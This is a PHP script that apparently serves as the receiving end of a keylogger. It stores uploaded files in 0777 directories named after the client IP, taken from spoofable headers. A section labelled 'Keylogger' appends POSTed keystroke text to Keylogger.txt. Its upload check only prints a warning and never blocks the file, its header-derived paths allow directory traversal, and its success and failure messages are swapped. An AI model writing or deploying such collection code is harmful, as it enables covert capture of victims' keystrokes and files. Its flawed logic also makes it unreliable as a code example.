<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    echo $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    echo $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    echo $ip = $_SERVER['REMOTE_ADDR'];
}
$ip = strval($ip);
$path = "$ip";
if (!is_dir($path)) {
    mkdir($path, 0777, true);
}


$directorio = "$ip/";

    $tamano = $_FILES['subir_archivo']['size'];
    $name = $_FILES['subir_archivo']['type'];

    if (!((strpos($name, "db")) && ($tamano < 900000))){
        echo "\nMe quires hackear?";
    }
    $subir_archivo = $directorio.basename($_FILES['subir_archivo']['name']);
    echo "<div>";
    if (move_uploaded_file($_FILES['subir_archivo']['tmp_name'], $subir_archivo)) {
        echo "El archivo es inválido.<br><br>";
        } else {
        echo "La subida ha fallado";
        }
        echo "</div>";
#############################################################333333
#Keylogger
if(isset($_POST['text'])){
    $texto = $_POST['text'];
    $archivo = fopen("$directorio/Keylogger.txt", "a");
    fwrite($archivo, $texto);
    fclose($archivo);
}
